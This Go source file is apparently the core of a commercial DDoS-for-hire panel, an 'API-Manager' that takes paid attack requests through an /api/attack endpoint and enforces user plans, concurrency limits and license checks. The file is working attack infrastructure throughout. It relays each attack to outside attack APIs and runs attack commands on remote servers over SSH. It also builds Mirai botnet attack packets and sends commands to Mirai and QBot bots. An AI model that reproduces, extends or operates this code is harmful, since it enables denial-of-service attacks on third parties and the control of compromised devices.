package main

import (
	"bufio"
	"bytes"
	"encoding/binary"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"io"
	"io/ioutil"
	"main.go/bot"
	"main.go/raw"
	"net/http"
	"os"
	"runtime"
	"strconv"
	"strings"
	"time"

	"github.com/gin-gonic/gin"
	"golang.org/x/crypto/ssh"
	"main.go/assets"
	"main.go/database"
	"main.go/logging"
)

var Config assets.Config

func handleCon(user assets.User, target string, duration time.Duration) bool {
	for i, v := range database.Cons.Current {
		if v.User.Name == user.Name {
			if !Config.Powersaving {
				if v.Con < user.Concurrent {
					database.Cons.Current[i].Con = database.Cons.Current[i].Con + 1
					database.Cons.Current[i].Targets = append(database.Cons.Current[i].Targets, target)
					go func() {
						time.Sleep(duration * time.Second)
						database.Cons.Current[i].Con = database.Cons.Current[i].Con - 1
						database.Cons.Current[i].Targets = remove(database.Cons.Current[i].Targets, target)
					}()
					return true
				}
				return false
			} else {
				if v.Con < user.Concurrent {
					for _, v := range database.Cons.Current {
						for _, t := range v.Targets {
							if t == target {
								return false
							}
						}
					}
					database.Cons.Current[i].Con = database.Cons.Current[i].Con + 1
					database.Cons.Current[i].Targets = append(database.Cons.Current[i].Targets, target)
					go func() {
						time.Sleep(duration * time.Second)
						database.Cons.Current[i].Con = database.Cons.Current[i].Con - 1
						database.Cons.Current[i].Targets = remove(database.Cons.Current[i].Targets, target)
					}()
					return true
				}
				return false
			}
		}
	}
	return false
}

func remove(targets []string, target string) []string {
	for i, v := range targets {
		if v == target {
			return append(targets[:i], targets[i+1:]...)
		}
	}
	return targets
}

func sendRequest(ip string, port string, duration string, method string) {
	for _, v := range database.Methods.Methods {
		if v.Name == method {
			if len(v.API) > 0 {
				for num, API := range v.API {
					go func(API string, num int) {
						api := strings.NewReplacer("[host]", ip, "[port]", port, "[time]", duration).Replace(API)
						resp, err := http.Get(api)
						if err != nil {
							logging.LogError(fmt.Sprintf("Error sending request to %s", api), err)
							return
						}
						defer func(Body io.ReadCloser) {
							err := Body.Close()
							if err != nil {
								logging.LogError(fmt.Sprintf("Error closing response from %s", api))
								return
							}
						}(resp.Body)
						_text, err := ioutil.ReadAll(resp.Body)
						if err != nil {
							logging.LogError(fmt.Sprintf("Error reading response from %s", api))
							return
						}
						if database.Debug {
							apiurl := strings.TrimLeft(api, "https://")
							apiurl = strings.Split(api, "/")[2]
							logging.Log(apiurl + " > " + string(_text))
						}
					}(API, num)
				}
			}
			if len(v.Server) > 0 {
				for _, server := range v.Server {
					go func(_server assets.Server) {
						file := strings.NewReplacer("[host]", ip, "[port]", port, "[time]", duration).Replace(_server.Command)
						_, err := remoteRun(_server.Username, _server.Password, _server.Host, file)
						if err != nil {
							logging.LogError(fmt.Sprintf("Error sending request to %s", _server.Host))
							return
						}
					}(server)
				}
			}
			buf := make([]byte, 0)
			var tmp []byte

			// Duration
			tmp = make([]byte, 4)
			dur, _ := strconv.ParseUint(duration, 10, 32)
			binary.BigEndian.PutUint32(tmp, uint32(dur))
			buf = append(buf, tmp...)

			// Method
			buf = append(buf, byte(v.MIRAI.MethodFlag))

			// Targets
			buf = append(buf, byte(1))

			// Target
			tmp = make([]byte, 5)
			strbuf := strings.Split(ip, ".")
			for i, v := range strbuf {
				val, _ := strconv.ParseUint(v, 10, 8)
				tmp[i] = byte(val)
			}
			tmp[4] = 32
			buf = append(buf, tmp...)

			buf = append(buf, byte(1))

			// Dport Flag
			tmp = make([]byte, 2)
			tmp[0] = uint8(v.MIRAI.PortFlag)
			strbaf := []byte(port)
			tmp[1] = uint8(len(strbaf))
			tmp = append(tmp, strbaf...)
			buf = append(buf, tmp...)

			// Total Length
			tmp = make([]byte, 2)
			binary.BigEndian.PutUint16(tmp, uint16(len(buf)+2))
			buf = append(tmp, buf...)
			if database.Debug {
				logging.Log("MIRAI > " + hex.EncodeToString(buf))
			}
			for _, qbot := range database.Mirai {
				_, err := qbot.Write(buf)
				if err != nil {
					return
				}
			}
			//
			qbotcmd := strings.NewReplacer("[host]", ip, "[port]", port, "[time]", fmt.Sprint(duration)).Replace(v.QBOT.Command)
			for _, qbot := range database.QBots {
				_, err := qbot.Write([]byte(qbotcmd))
				if err != nil {
					return
				}
			}
			if database.Debug {
				logging.Log("QBOT > " + qbotcmd)
			}
		}
	}
}

func stringInArray(items string, list []string) bool {
	for _, v := range list {
		if items == v {
			return true
		}
	}
	return false
}

func CheckBlacklist(tgt string) bool {
	for _, target := range Config.Blacklist {
		domain := strings.Contains(target, "*")
		_end := strings.Split(target, "*")
		if domain {
			if strings.Contains(tgt, _end[1]) {
				return true
			}
		} else {
			if strings.ToLower(target) == strings.ToLower(tgt) {
				return true
			}
		}
	}
	return false
}

func remoteRun(user string, password string, addr string, cmd string) (string, error) {
	Config := &ssh.ClientConfig{
		User:            user,
		HostKeyCallback: ssh.InsecureIgnoreHostKey(),
		Auth: []ssh.AuthMethod{
			ssh.Password(password),
		},
		Timeout: 3 * time.Second,
	}

	client, err := ssh.Dial("tcp", addr, Config)
	if err != nil {
		return "", err
	}
	session, err := client.NewSession()
	if err != nil {
		return "", err
	}
	defer func(session *ssh.Session) {
		err := session.Close()
		if err != nil {
			logging.LogError("Error closing session")
			return
		}
	}(session)
	var b bytes.Buffer
	session.Stdout = &b
	err = session.Run(cmd)
	return b.String(), err
}

func checkPermission(user assets.User, method assets.Method) bool {
	if strings.ToLower(user.Role) == "admin" {
		return true
	}
	for _, v := range method.Permissions {
		if strings.ToLower(v) == strings.ToLower(user.Role) {
			return true
		}
	}
	return false
}

func getMethod(method string) assets.Method {
	for _, v := range database.Methods.Methods {
		if v.Name == method {
			return v
		}
	}
	return assets.Method{}
}

func getMethods(c *gin.Context) {
	var methodList []string
	for _, v := range database.Methods.Methods {
		methodList = append(methodList, v.Name)
	}
	c.JSON(http.StatusOK, gin.H{"Methods": methodList})
}

func StartCooldown(user assets.User) {
	user.HasCooldown = true
	go func() {
		time.Sleep(time.Duration(user.Cooldown) * time.Second)
		user.HasCooldown = false
		return
	}()

}
func attack(c *gin.Context) {
	user, foundUser := c.GetQuery("username")
	key, foundKey := c.GetQuery("key")
	ip, foundIP := c.GetQuery("host")
	port, foundPort := c.GetQuery("port")
	duration, foundDuration := c.GetQuery("time")
	method, foundMethod := c.GetQuery("method")
	sent := time.Now().Format("2006-01-02 15:04:05")
	logging.Log(c.Request.RemoteAddr + " | " + c.Request.URL.String())
	var lines string
	if foundUser && foundKey && foundIP && foundPort && foundDuration && foundMethod {
		_duration, err := strconv.Atoi(duration)
		if err != nil {
			c.JSON(http.StatusBadRequest, gin.H{
				"error": "Invalid time",
			})
			return
		}
		if strings.Contains(c.Request.URL.String(), "%20") {
			c.IndentedJSON(http.StatusOK, gin.H{"error": true, "message": "Invalid Parameters"})
			return
		}
		if strings.Contains(c.Request.URL.String(), "%0a") {
			c.IndentedJSON(http.StatusOK, gin.H{"error": true, "message": "Invalid Parameters"})
			return
		}
		if strings.Contains(c.Request.URL.String(), "%0d") {
			c.IndentedJSON(http.StatusOK, gin.H{"error": true, "message": "Invalid Parameters"})
			return
		}
		if ip == "" || port == "" || duration == "" || method == "" {
			c.IndentedJSON(http.StatusOK, gin.H{"error": true, "message": "Invalid Parameters"})
			return
		}
		if CheckBlacklist(ip) {
			c.IndentedJSON(http.StatusOK, gin.H{"error": true, "message": "Blacklisted"})
			return
		}
		if len(Config.Whitelist) > 0 {
			fmt.Println(c.Request.RemoteAddr)
			if !stringInArray(strings.Split(c.Request.RemoteAddr, ":")[0], Config.Whitelist) {
				c.IndentedJSON(http.StatusOK, gin.H{"error": true, "message": "Connection Blocked"})
				return
			}
		}
		m := getMethod(method)
		if m.Name == "" {
			c.IndentedJSON(http.StatusOK, gin.H{"error": true, "message": "Invalid Method"})
			return
		}
		if _duration > m.Time {
			c.IndentedJSON(http.StatusOK, gin.H{"error": true, "message": "Exceeded Method Time"})
			return
		}
		if _duration > Config.TimeLimit {
			c.IndentedJSON(http.StatusOK, gin.H{"error": true, "message": "Exceeded Global Time"})
			return
		}
		if database.GetActiveCons() > Config.MaxCons {
			c.IndentedJSON(http.StatusOK, gin.H{"error": true, "message": "Global Concurrents Reached"})
			return
		}
		if database.AuthUser(user, key) {
			_user := database.GetUser(user)
			running := 0
			if (assets.User{}) == _user {
				c.String(200, "Invalid Credentials")
				return
			}
			if !checkPermission(_user, m) {
				c.IndentedJSON(http.StatusOK, gin.H{"error": true, "message": "Insufficient Permissions"})
				return
			}
			if _user.MaxTime < _duration {
				c.IndentedJSON(http.StatusOK, gin.H{"error": true, "message": "Exceeded Max Time"})
				return
			}
			if _user.HasCooldown {
				c.IndentedJSON(http.StatusOK, gin.H{"error": true, "message": "Cooldown Active"})
				return
			}
			if handleCon(_user, ip, time.Duration(_duration)) {
				now := time.Now()
				date, _ := time.Parse("02-01-2006", now.Format("02-01-2006"))
				expiry, _ := time.Parse("02-01-2006", _user.Expiry)
				if date.After(expiry) {
					c.IndentedJSON(http.StatusOK, gin.H{"error": true, "message": "Account Expired"})
					return
				}
				for _, con := range database.Cons.Current {
					if con.User.Name == _user.Name {
						running = con.Con
						go StartCooldown(_user)
						file, err := os.Open("config/response.tmpl")
						if err != nil {
							logging.LogError(fmt.Sprintf("Error opening response.tmpl %s", err))
						}
						scanner := bufio.NewScanner(file)
						for scanner.Scan() {
							_cons := strconv.Itoa(running)
							_max := strconv.Itoa(con.User.Concurrent)
							_method := getMethod(method)
							_apis := strconv.Itoa(len(_method.API))
							_servers := strconv.Itoa(len(_method.Server))
							qbotlen := strconv.Itoa(len(database.QBots))
							mirialen := strconv.Itoa(len(database.Mirai))
							_newLine := strings.NewReplacer("[username]", _user.Name, "[host]", ip, "[port]", port, "[time]", duration, "[error]", "false", "[method]", method, "[cons]", _cons, "[maxCons]", _max, "[apis]", _apis, "[servers]", _servers, "[qbots]", qbotlen, "[mirais]", mirialen).Replace(scanner.Text())
							lines += _newLine + "\r\n"
						}
						mode := strings.Split(lines, "\r\n")[0]
						if mode == "MODE-HTML" {
							c.Data(http.StatusOK, "text/html; charset=utf-8", []byte(lines[10:]))
						} else if mode == "MODE-JSON" {
							data := []byte(strings.Split(lines[11:], "\r\n")[0])
							c.Data(http.StatusOK, "application/json", data)
						} else {
							c.IndentedJSON(http.StatusOK, gin.H{"error": false, "message": lines})
						}
						go sendRequest(ip, port, duration, method)
						logging.Log("Attack Sent > " + fmt.Sprintf("%s %s %s %s %s %s", sent, user, ip, port, duration, method) + " <")
						go database.SendLog(fmt.Sprintf("**USER ATTACK SENT SUCCESSFULLY**\r\n\r\n**Username**: \r\n%s\r\n**Target**: \r\n%s\r\n**Port**: \r\n%s\r\n**Duration**: \r\n%s\r\n**Method**: \r\n%s\r\n**Time Sent**: \r\n%s\r\n**User Conns**:\r\n %s / %s\r\n**Remote IP**: \r\n%s", user, ip, port, duration, method, time.Now().Format("02-01-2006 15:04:05"), strconv.Itoa(running), strconv.Itoa(con.User.Concurrent), c.Request.RemoteAddr))
						err = file.Close()
						if err != nil {
							return
						}
						return
					}
				}
			} else {
				c.String(200, "Max Concurrent Reached")
			}
		} else {
			c.String(200, "Invalid Key")
		}
	} else {
		c.String(200, "Invalid Parameters")
	}
}
func getPlan(c *gin.Context) {
	user, foundUser := c.GetQuery("username")
	key, foundKey := c.GetQuery("key")
	if foundUser == false {
		c.JSON(400, gin.H{"error": "Invalid Parameters"})
		return
	}
	if foundKey == false {
		c.JSON(400, gin.H{"error": "Invalid Parameters"})
		return
	}
	if database.AuthUser(user, key) == false {
		c.JSON(400, gin.H{"error": "Account not Found"})
		return
	}
	for _, _user := range database.Users {
		if _user.Name == user && _user.Key == key {
			c.JSON(200, gin.H{"success": true, "Username": _user.Name, "MaxTime": _user.MaxTime, "Concurrent": _user.Concurrent, "Banned": _user.Banned, "Expiry": _user.Expiry})
		}
	}
}
func InfoPage(c *gin.Context) {
	lines := ""
	file, err := os.Open("config/info.tmpl")
	if err != nil {
		logging.LogError(fmt.Sprintf("Error opening info.tmpl %s", err))
	}
	defer func(file *os.File) {
		err := file.Close()
		if err != nil {
			return
		}
	}(file)
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		methods := ""
		for _, method := range database.Methods.Methods {
			methods += method.Name + " "
		}
		mlen := strconv.Itoa(len(database.Methods.Methods))
		ulen := strconv.Itoa(len(database.Users))
		clen := strconv.Itoa(database.GetActiveCons())
		qbotlen := strconv.Itoa(len(database.QBots))
		mirialen := strconv.Itoa(len(database.Mirai))
		_newLine := strings.NewReplacer("[methodCount]", mlen, "[methods]", methods, "[userCount]", ulen, "[consCount]", clen, "[qbots]", qbotlen, "[mirais]", mirialen).Replace(scanner.Text())
		lines += _newLine + "\r\n"
	}
	c.Data(http.StatusOK, "text/html; charset=utf-8", []byte(lines))
}

func checkKey(license string) (bool, time.Time) {
	resp, err := http.Get("https://pastebin.com/raw/nM9kk2xV")
	if err != nil {
		logging.LogError(fmt.Sprintf("Error checking license %s", err))
	}
	defer func(Body io.ReadCloser) {
		err := Body.Close()
		if err != nil {
			return
		}
	}(resp.Body)
	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		logging.LogError(fmt.Sprintf("Error checking license %s", err))
	}
	_text := string(body)
	for _, key := range strings.Split(_text, "\r\n") {
		fmt.Println(key)
		_key := strings.Split(key, "|")[0]
		_expire := strings.Split(key, "|")[1]
		if _key == license {
			date, _ := time.Parse("02-01-2006", time.Now().Format("02-01-2006"))
			expiry, _ := time.Parse("02-01-2006", _expire)
			if date.Before(expiry) {
				return true, expiry
			}
		}
		return false, time.Now()
	}
	return false, time.Now()
}

func main() {
	// set GOMAXPROCS to number of cores
	runtime.GOMAXPROCS(runtime.NumCPU())
	if len(os.Args) < 2 {
		logging.LogError("Usage: ./main <license>")
	}
	database.License = os.Args[1]
	if len(os.Args) == 3 {
		database.Debug = true
	}
	methodFile, err := os.Open("config/methods.json")
	if err != nil {
		logging.LogError(fmt.Sprintf("Error opening  Methods.json %s", err))
		os.Exit(1)
	}
	defer func(methodFile *os.File) {
		err := methodFile.Close()
		if err != nil {
			return
		}
	}(methodFile)
	methodValue, _ := ioutil.ReadAll(methodFile)
	err = json.Unmarshal(methodValue, &database.Methods)
	if err != nil {
		return
	}
	ConfigFile, err := os.Open("config/config.json")
	if err != nil {
		logging.LogError("Failed to open Config.json")
		os.Exit(1)
	}
	defer func(ConfigFile *os.File) {
		err := ConfigFile.Close()
		if err != nil {
			return
		}
	}(ConfigFile)
	ConfigValue, _ := ioutil.ReadAll(ConfigFile)
	err = json.Unmarshal(ConfigValue, &database.Config)
	if err != nil {
		return
	}
	err = json.Unmarshal(ConfigValue, &Config)
	if err != nil {
		return
	}
	logging.Log("Loaded Config ✓")
	database.Connect()
	logging.Log("Connected to database ✓")
	success, _time := checkKey(database.License)
	if success == false {
		logging.LogError("Invalid License")
		os.Exit(1)
	} else {
		logging.Log("License Validated - Welcome back! | Expiry: " + _time.Format("02-01-2006"))
	}
	logging.Log("Loaded Tables ✓")
	err = database.LoadSettings()
	if (assets.Settings{}) == database.Settings {
		logging.Log("No Settings found!")
		fmt.Println("Enter Port> ")
		_, err := fmt.Scanln(&database.Settings.Host)
		if err != nil {
			return
		}
		fmt.Println("Enabled [0/1]> ")
		_, err = fmt.Scanln(&database.Settings.Enabled)
		if err != nil {
			return
		}
	}
	logging.Log("Loaded settings ✓")
	err = database.LoadUsers()
	if err != nil {
		logging.LogError("Failed to load users", err)
		os.Exit(-1)
	}
	if database.Users == nil {
		logging.Log("No Users found!")
		logging.Log("Create Admin Account")
		var user assets.User
		fmt.Println("Enter Username> ")
		_, err := fmt.Scanln(&user.Name)
		if err != nil {
			return
		}
		fmt.Println("Enter Key> ")
		_, err = fmt.Scanln(&user.Key)
		if err != nil {
			return
		}
		user.Role = "admin"
		fmt.Println("Enter MaxTime> ")
		_, err = fmt.Scanln(&user.MaxTime)
		if err != nil {
			return
		}
		fmt.Println("Enter Cons> ")
		_, err = fmt.Scanln(&user.Concurrent)
		if err != nil {
			return
		}
		user.Banned = 0
		user.Cooldown = 0
		user.HasCooldown = false
		user.Expiry = "10-10-9999"
		if len(database.Users) >= 0 && database.Users != nil {
			user.ID = len(database.Users) + 1
		} else {
			user.ID = 0
		}
		database.CreateUser(user)
		logging.Log("Loaded users ✓")
		time.Sleep(2 * time.Second)
		err = database.Save()
		if err != nil {
			logging.LogError("Failed to save", err)
			os.Exit(-1)
		}
		logging.Log("Saved ✓")
	}
	for _, v := range database.Users {
		database.Cons.Current = append(database.Cons.Current, assets.Concurrent{User: v, Targets: []string{}})
	}
	gin.SetMode(gin.ReleaseMode)
	router := gin.Default()
	gin.DefaultWriter = ioutil.Discard
	logging.Log("Started API-Manager " + database.Version + " ✓")
	router.GET("/api/plan", getPlan)
	router.GET("/api/attack", attack)
	router.GET("/api/methods", getMethods)
	router.GET("/", InfoPage)
	go func() {
		err := router.Run(":" + database.Settings.Host)
		if err != nil {
			logging.LogError(fmt.Sprintf("Error starting API %s", err))
		}
	}()
	go raw.QBotListener()
	logging.Log("Started QBot Listener " + database.Config.QBot.Host + ":" + strconv.Itoa(database.Config.QBot.Port) + " ✓")
	go raw.MiraiListener()
	logging.Log("Started Mirai Listener " + database.Config.Mirai.Host + ":" + strconv.Itoa(database.Config.Mirai.Port) + " ✓")
	go bot.Run()
	database.SendLog("API-Manager Started")
	select {}
}
